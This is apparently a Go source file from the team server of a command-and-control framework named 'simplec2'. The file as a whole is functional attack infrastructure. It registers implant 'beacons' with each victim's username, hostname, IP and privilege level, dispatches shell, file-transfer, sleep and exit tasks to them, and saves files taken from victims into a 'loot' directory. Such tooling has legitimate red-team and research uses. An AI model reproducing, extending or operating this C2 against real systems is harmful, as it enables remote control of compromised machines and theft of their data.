package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"

	"github.com/google/uuid"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"

	"simplec2/pkg/bridge"
	"simplec2/pkg/config"
	"simplec2/teamserver/data"
)

// server is used to implement bridge.TeamServerBridgeService.
type server struct {
	bridge.UnimplementedTeamServerBridgeServiceServer
	Config *config.TeamServerConfig
}

// NewServer creates a new server instance with the given configuration.
func NewServer(cfg *config.TeamServerConfig) *server {
	return &server{Config: cfg}
}

func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
	log.Printf("Received StageBeacon from listener: %s", in.ListenerName)

	// Extract remote address from gRPC context
	var remoteAddr string
	p, ok := peer.FromContext(ctx)
	if ok {
		remoteAddr = p.Addr.String()
	}

	// Always generate a new UUID for the beacon on the server side.


	beacon := data.Beacon{
		BeaconID:      uuid.New().String(),
		Listener:      in.ListenerName,
		RemoteAddr:    remoteAddr,
		Status:        "active",
		FirstSeen:     time.Now(),
		LastSeen:      time.Now(),
		Sleep:         5, // Default sleep
		OS:            in.Metadata.Os,
		Arch:          in.Metadata.Arch,
		Username:      in.Metadata.Username,
		Hostname:      in.Metadata.Hostname,
		InternalIP:    in.Metadata.InternalIp,
		ProcessName:   in.Metadata.ProcessName,
		PID:           in.Metadata.Pid,
		IsHighIntegrity: in.Metadata.IsHighIntegrity,
	}

	result := data.DB.Create(&beacon)
	if result.Error != nil {
		log.Printf("Error saving beacon to database: %v", result.Error)
		return nil, result.Error
	}

	log.Printf("New beacon with ID %s saved to database (DB ID: %d)", beacon.BeaconID, beacon.ID)

	return &bridge.StageBeaconResponse{
		AssignedBeaconId: beacon.BeaconID,
		SessionKey:       beacon.SessionKey,
	}, nil
}

func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
	log.Printf("Received CheckInBeacon from beacon: %s", in.BeaconId)

	var grpcTasks []*bridge.Task
	var dispatchedTaskIDs []uint
	var newSleepInterval int32 = 0 // Default to 0, meaning no change

	// Find the beacon, including soft-deleted ones (unscoped), to handle 'exiting' state.
	var beacon data.Beacon
	result := data.DB.Unscoped().Where("beacon_id = ?", in.BeaconId).First(&beacon)

	if result.Error != nil {
		// If beacon is truly not found (even unscoped), it means it has already exited or never existed.
		log.Printf("Beacon %s not found (even unscoped) during check-in: %v. Assuming exited.", in.BeaconId, result.Error)
		return nil, status.Errorf(codes.NotFound, "beacon not found")
	}

	// Update beacon's last seen time
	beacon.LastSeen = time.Now()

	// If beacon is in 'exiting' state, send it an exit task.
	if beacon.Status == "exiting" && beacon.DeletedAt.Valid {
		log.Printf("Beacon %s is in 'exiting' state and soft-deleted. Sending final exit task.", in.BeaconId)
		// Create an exit task to send back
		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    uuid.New().String(), // Generate a new task ID for this final exit task
			CommandId: 4, // CommandID for exit
			Arguments: nil,
		})
		// Save the updated LastSeen for the unscoped beacon
		data.DB.Unscoped().Save(&beacon)
		return &bridge.CheckInBeaconResponse{
			Tasks: grpcTasks,
			NewSleep: 0, // No new sleep interval needed, it's exiting
		}, nil
	}

	// If beacon is not in 'exiting' state or not soft-deleted, save its updated last seen.
	data.DB.Save(&beacon)

	// Find queued tasks for this beacon (only active ones, GORM will filter soft-deleted automatically)
	var dbTasks []data.Task
	data.DB.Where("beacon_id = ? AND status = ?", in.BeaconId, "queued").Find(&dbTasks)

	if len(dbTasks) > 0 {
		log.Printf("Found %d tasks for beacon %s", len(dbTasks), in.BeaconId)
	}

	// Convert DB tasks to gRPC tasks
	for _, dbTask := range dbTasks {
		var cmdID uint32
		var taskArgs []byte

		switch dbTask.Command {
		case "shell":
			cmdID = 1
			taskArgs = []byte(dbTask.Arguments)

		case "download":
			cmdID = 2
			var downloadArgs struct {
				Source      string `json:"source"`
				Destination string `json:"destination"`
			}
			if err := json.Unmarshal([]byte(dbTask.Arguments), &downloadArgs); err != nil {
				log.Printf("Error parsing download args for task %s: %v", dbTask.TaskID, err)
				continue
			}

			fileData, err := os.ReadFile(downloadArgs.Source)
			if err != nil {
				log.Printf("Error reading source file %s for task %s: %v", downloadArgs.Source, dbTask.TaskID, err)
				continue
			}

			destPathBytes := []byte(downloadArgs.Destination)
			pathLen := uint32(len(destPathBytes))
			buf := new(bytes.Buffer)
			binary.Write(buf, binary.BigEndian, pathLen)
			buf.Write(destPathBytes)
			buf.Write(fileData)
			taskArgs = buf.Bytes()

		case "upload":
			cmdID = 3
			taskArgs = []byte(dbTask.Arguments)

		case "exit":
			cmdID = 4
			taskArgs = nil

		case "sleep":
			cmdID = 5
			// Arguments for sleep is just the integer duration
			sleepDuration, err := strconv.Atoi(dbTask.Arguments)
			if err != nil {
				log.Printf("Error parsing sleep duration for task %s: %v", dbTask.TaskID, err)
				continue
			}
			newSleepInterval = int32(sleepDuration)
			// Update beacon's sleep in DB immediately
			beacon.Sleep = sleepDuration
			data.DB.Save(&beacon)
			taskArgs = []byte(dbTask.Arguments) // Send duration back as args

		case "browse":
			cmdID = 6
			taskArgs = []byte(dbTask.Arguments)

		default:
			log.Printf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
			continue
		}

		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    dbTask.TaskID,
			CommandId: cmdID,
			Arguments: taskArgs,
		})
		dispatchedTaskIDs = append(dispatchedTaskIDs, dbTask.ID)
	}

	// Update status of dispatched tasks
	if len(dispatchedTaskIDs) > 0 {
		data.DB.Model(&data.Task{}).Where("id IN ?", dispatchedTaskIDs).Update("status", "dispatched")
	}

	// If beacon has a specific sleep interval set, send it back
	if beacon.Sleep > 0 {
		newSleepInterval = int32(beacon.Sleep)
	}

	return &bridge.CheckInBeaconResponse{
		Tasks:   grpcTasks,
		NewSleep: newSleepInterval,
	}, nil
}

func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutputRequest) (*bridge.PushBeaconOutputResponse, error) {
	log.Printf("Received PushBeaconOutput for task %s from beacon: %s", in.TaskId, in.BeaconId)

	// Find the task to check its command type
	var task data.Task
	if err := data.DB.Where("task_id = ?", in.TaskId).First(&task).Error; err != nil {
		log.Printf("Error finding task %s: %v", in.TaskId, err)
		return nil, err
	}

	var outputMessage string
	// Handle file upload differently
	if task.Command == "upload" {
		// Sanitize the original filename to prevent path traversal
		originalPath := filepath.Base(task.Arguments)
		lootFileName := fmt.Sprintf("%s_%s", task.TaskID, originalPath)
		lootFilePath := filepath.Join(s.Config.LootDir, lootFileName)

		if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
			log.Printf("Error saving uploaded file for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to save uploaded file: %v", err)
		} else {
			log.Printf("Saved uploaded file to %s", lootFilePath)
			outputMessage = lootFileName
		}
	} else if task.Command == "exit" {
		outputMessage = "Beacon received exit command."
	} else {
		// Intelligent decoding of beacon output.
		// First, check if it's already valid UTF-8.
		if utf8.Valid(in.Output) {
			outputMessage = string(in.Output)
		} else {
			// If not, assume it's from a Windows codepage like GBK and try to decode it.
			decoder := simplifiedchinese.GBK.NewDecoder()
			utf8Bytes, _, err := transform.Bytes(decoder, in.Output)
			if err == nil {
				outputMessage = string(utf8Bytes)
			} else {
				// If GBK decoding fails, fall back to lossy conversion as a last resort.
				outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
			}
		}
	}

	// Update task status and output message
	result := data.DB.Model(&task).Updates(map[string]interface{}{
		"status": "completed",
		"output": outputMessage,
	})

	if result.Error != nil {
		log.Printf("Error updating task output: %v", result.Error)
		return nil, result.Error
	}

	return &bridge.PushBeaconOutputResponse{}, nil
}
